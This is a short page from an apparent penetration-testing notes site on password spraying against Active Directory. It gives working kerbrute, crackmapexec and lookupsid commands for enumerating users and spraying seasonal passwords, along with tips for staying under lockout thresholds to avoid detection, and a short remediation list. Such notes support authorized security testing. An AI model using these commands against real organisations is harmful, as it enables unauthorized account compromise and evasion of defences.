---
tags:
  - Network
  - Windows
---

# :material-shield-account: Password Spraying

<span class="pill pill-medium">initial access</span> <span class="pill pill-info">network</span>

Instead of many passwords against one user (lockout!), try **one** password against **every** user. On a big org, someone always uses `Season2024!`.

!!! abstract "TL;DR"
    Build a user list, learn the lockout policy, then spray a couple of seasonal/company passwords slowly, staying under the threshold.

## :material-account-multiple: Build the user list

```bash
# From AD (any creds) or OSINT
lookupsid.py corp/u:p@DC | grep SidTypeUser
kerbrute userenum -d corp.local --dc DC users.txt   # no creds needed
# name formats: flast, first.last, firstl@corp.local
```

## :material-water: Spray safely

```bash
# Check lockout policy FIRST
crackmapexec smb DC -u u -p p --pass-pol

kerbrute passwordspray -d corp.local users.txt 'Spring2025!'
crackmapexec smb DC -u users.txt -p 'Welcome1' --continue-on-success
```

Wait out the observation window between attempts (e.g. 1 try / 30 min).

!!! opsec "Lockouts = incident tickets"
    Miscount the policy and you lock hundreds of accounts — instantly detected and disruptive. Confirm the policy and pad your margin.

!!! loot "One hit unlocks the domain"
    A single valid low-priv credential enables LDAP enumeration, [Kerberoasting](kerberos.md), and [BloodHound](bloodhound.md) pathing.

## :material-shield-check: Remediation

- MFA everywhere; ban weak/seasonal passwords; smart lockout + alerting on spray patterns.

## :material-link-variant: Related

- Feeds [Kerberos](kerberos.md) roasting and [BloodHound](bloodhound.md) analysis.
- Reuse creds against web [Auth Bypass](../web/auth-bypass.md) targets.
- Reference: [The Hacker Recipes — Password Spraying](https://www.thehacker.recipes/).
